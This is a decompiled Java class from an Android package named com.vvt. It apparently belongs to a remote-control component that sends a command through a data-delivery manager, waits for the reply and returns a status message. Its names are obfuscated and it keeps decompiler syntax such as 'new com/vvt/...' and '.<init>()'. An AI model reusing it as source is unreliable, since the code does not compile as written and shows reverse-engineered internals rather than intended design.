package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.i;
import com.vvt.phoenix.prot.command.ab;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class be
{
  private static final boolean a = com.vvt.ak.a.a;
  private ConditionVariable b;
  private com.vvt.datadeliverymanager.a.a c;
  private RmtCtrlOutputStatusMessage d;
  
  public be()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.d = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.c = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    bf localbf = new com/vvt/appengine/a/bf;
    localbf.<init>(this);
    return localbf;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    try
    {
      Object localObject1 = new com/vvt/datadeliverymanager/h;
      ((com.vvt.datadeliverymanager.h)localObject1).<init>();
      int i = 30;
      ((com.vvt.datadeliverymanager.h)localObject1).a(i);
      Object localObject3 = new com/vvt/phoenix/prot/command/ab;
      ((ab)localObject3).<init>();
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject3);
      localObject3 = DeliveryRequestType.REQUEST_TYPE_NEW;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DeliveryRequestType)localObject3);
      localObject3 = PriorityRequest.PRIORITY_NORMAL;
      ((com.vvt.datadeliverymanager.h)localObject1).a((PriorityRequest)localObject3);
      localObject3 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DataProviderType)localObject3);
      i = 15;
      ((com.vvt.datadeliverymanager.h)localObject1).c(i);
      long l = 60000L;
      ((com.vvt.datadeliverymanager.h)localObject1).b(l);
      i = 1;
      ((com.vvt.datadeliverymanager.h)localObject1).c(i);
      boolean bool = true;
      ((com.vvt.datadeliverymanager.h)localObject1).b(bool);
      localObject3 = this.c;
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject3);
      localObject3 = new android/os/ConditionVariable;
      ((ConditionVariable)localObject3).<init>(false);
      this.b = ((ConditionVariable)localObject3);
      localObject3 = paramh.g;
      ((com.vvt.datadeliverymanager.b)localObject3).a((com.vvt.datadeliverymanager.h)localObject1);
      localObject1 = this.b;
      ((ConditionVariable)localObject1).block();
      localObject1 = this.d;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
  
  void a(i parami)
  {
    synchronized (this.d)
    {
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.d;
      boolean bool = parami.f();
      localRmtCtrlOutputStatusMessage2.setSuccess(bool);
      localRmtCtrlOutputStatusMessage2 = this.d;
      String str = parami.e();
      localRmtCtrlOutputStatusMessage2.setMessage(str);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/be.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */